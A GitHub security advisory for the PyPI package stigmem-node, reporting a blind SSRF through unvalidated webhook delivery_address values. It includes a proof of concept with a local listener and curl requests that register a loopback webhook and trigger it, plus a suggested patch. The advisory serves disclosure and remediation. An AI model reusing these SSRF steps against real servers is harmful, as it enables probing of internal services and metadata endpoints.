# [M] stigmem-node has blind SSRF via unvalidated webhook subscription delivery_address

## Summary
Severity: Medium
Advisory: GHSA-5p3m-vhh6-9236
CWE: CWE-20, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-5p3m-vhh6-9236
Type: github-advisory

## Affected
- PyPI: `stigmem-node` — affected >=0 <0.9.0a11

## Details
### Summary

Stigmem allows an authenticated user to create a webhook subscription with a user-controlled `delivery_address`. That value is stored and later used directly by the subscription delivery worker as the destination of a server-side HTTP POST request.

The codebase already contains an outbound SSRF guard, `assert_safe_url()`, which blocks loopback, private, link-local, and metadata-style destinations. However, the subscription webhook delivery path does not appear to apply this guard either when the subscription is created or immediately before delivery.

As a result, an authenticated user can configure a webhook destination such as `http://127.0.0.1:9999/ssrf`, trigger a matching fact-change event, and cause the Stigmem server to issue a server-side HTTP request to an internal loopback address.

### Details

Relevant files:

```text
node/src/stigmem_node/routes/subscriptions.py
node/src/stigmem_node/subscription_delivery.py
node/src/stigmem_node/models/subscriptions.py
node/src/stigmem_node/utility/net_util.py

SubscriptionCreateRequest accepts delivery_address as a plain string and validates only that it has a minimum length:

class SubscriptionCreateRequest(BaseModel):
    target: str = Field(..., min_length=1)
    on_change: str = Field(...)
    delivery_address: str = Field(..., min_length=1)

The create route persists this value directly:

conn.execute(
    """INSERT INTO subscriptions
       (id, subscriber_identity, target, target_kind, on_change,
        delivery_address, idempotency_key, created_at, tenant_id)
       VALUES (?,?,?,?,?,?,?,?,?)""",
    (
        sub_id,
        identity.entity_uri,
        req.target,
        target_kind,
        req.on_change,
        req.delivery_address,
        req.idempotency_key,
        now,
        identity.tenant_id,
    ),
)

The delivery worker later sends a server-side request to the stored value:

with httpx.Client(timeout=10.0) as client:
    resp = client.post(
        event["delivery_address"],
        json=body,
        headers={
            "Content-Type": "application/json",
            "X-Stigmem-Event-Id": event["id"],
        },
    )

The codebase already has an SSRF guard in node/src/stigmem_node/utility/net_util.py:

def assert_safe_url(
    url: str,
    *,
    allow_schemes: frozenset[str] = frozenset({"https"}),
) -> None:

This guard blocks private, loopback, link-local, and metadata-style ranges, including 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, and 169.254.0.0/16.

However, I did not observe assert_safe_url() being called for subscription delivery_address during subscription creation or before webhook delivery.

PoC

Tested against stigmem-node 0.9.0a10.

Start an internal listener on the same host:
const http = require("http");

http.createServer((req, res) => {
  console.log("HIT:", req.method, req.url);
  console.log("HEADERS:", req.headers);

  let body = "";
  req.on("data", chunk => body += chunk);
  req.on("end", () => {
    console.log("BODY:", body);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true, internal: true }));
  });
}).listen(9999, "127.0.0.1", () => {
  console.log("Listening on http://127.0.0.1:9999");
});
Start Stigmem locally:
cd node
pip install -e .
export STIGMEM_DB_PATH="$(pwd)/ssrf-test.db"
export STIGMEM_AUTH_REQUIRED=true
export STIGMEM_HOST=127.0.0.1
export STIGMEM_PORT=8765
export STIGMEM_SUBSCRIPTION_DELIVERY_SWEEP_S=1
export KEY=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
stigmem auth bootstrap-key --key "$KEY"
stigmem-node
Confirm the service is running:
curl -i http://127.0.0.1:8765/healthz

Response:

HTTP/1.1 200 OK
{"status":"ok"}
Create a webhook subscription whose delivery_address points to loopback:
curl -i -X POST "http://127.0.0.1:8765/v1/subscriptions" \
  -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "local",
    "on_change": "webhook",
    "delivery_address": "http://127.0.0.1:9999/ssrf",
    "idempotency_key": "ssrf-test-1"
  }'

Observed response:

HTTP/1.1 201 Created

The response confirmed that the loopback webhook destination was accepted and stored:

{
  "on_change": "webhook",
  "delivery_address": "http://127.0.0.1:9999/ssrf",
  "circuit_open": false,
  "consecutive_failures": 0
}
Trigger a matching fact-change event:
curl -i -X POST "http://127.0.0.1:8765/v1/facts" \
  -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "entity": "stigmem://test/entity/ssrf",
    "relation": "test:relation",
    "value": { "type": "text", "v": "trigger webhook ssrf" },
    "source": "stigmem://test/source/researcher",
    "scope": "local"
  }'
The internal listener receives a server-side request from Stigmem:
HIT: POST /ssrf
HEADERS: {
  host: '127.0.0.1:9999',
  accept: '*/*',
  'accept-encoding': 'gzip, deflate',
  connection: 'keep-alive',
  'user-agent': 'python-httpx/0.28.1',
  'content-type': 'application/json',
  'x-stigmem-event-id': '<event-id>',
  'content-length': '506'
}

The body contained the Stigmem event payload, including the subscription id, entity, relation, value, source, timestamp, and scope.

This confirms that an authenticated user-controlled subscription webhook destination can cause the Stigmem backend to connect to an internal loopback service.

Impact

This creates a blind SSRF primitive from the Stigmem server.

An authenticated user can cause the Stigmem backend to make HTTP POST requests to internal destinations reachable from the server, including loopback services, private network services, and link-local metadata-style endpoints if reachable in the deployment environment.

Potential impact includes:

- Internal service probing through webhook delivery success/failure behavior
- Requests to localhost-only admin services
- Requests to private RFC1918 network services
- Requests to cloud metadata/link-local endpoints where reachable
- Persistent SSRF because the malicious webhook destination is stored and retried

Even if the HTTP response body is not returned to the attacker, delivery status, retry behavior, circuit-breaker behavior, and logs may provide an internal reachability oracle.

Suggested remediation

Apply destination validation at both subscription creation time and delivery time.

Recommended changes:

1. For `on_change="webhook"`, validate `delivery_address` with `assert_safe_url()`.
2. Prefer `https://` only by default.
3. If `http://` is needed for local development, require an explicit operator-controlled allowlist.
4. Re-validate immediately before delivery to reduce stale validation and DNS rebinding risk.
5. Disable redirects or validate every redirect target before following.
6. Add regression tests proving that localhost, 127.0.0.1, private RFC1918 ranges, and 169.254.169.254 are rejected as webhook destinations.

Example patch pattern:

from stigmem_node.utility.net_util import assert_safe_url

if req.on_change == "webhook":
    try:
        assert_safe_url(req.delivery_address, allow_schemes=frozenset({"https"}))
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=f"unsafe webhook URL: {exc}") from exc

And before delivery:

try:
    assert_safe_url(event["delivery_address"], allow_schemes=frozenset({"https"}))
except ValueError:
    mark_delivery_failed(...)
    return

Before clicking submit, attach screenshot or paste the listener proof in the PoC section. This is the key evidence:

```text
HIT: POST /ssrf
user-agent: python-httpx/0.28.1
x-stigmem-event-id: ...

Kindly check this out:
[Eidetic_CVE_Report.pdf](https://github.com/user-attachments/files/28415009/Eidetic_CVE_Report.pdf)

## References
- https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-5p3m-vhh6-9236
- https://github.com/eidetic-labs/stigmem/pull/726
- https://github.com/eidetic-labs/stigmem/commit/11637401d50629fef040382aee5af4571842c152
- https://github.com/eidetic-labs/stigmem/commit/2ff5be29291d1c042e00d57c5f9ef93650cc90e0
- https://github.com/eidetic-labs/stigmem
- https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a11
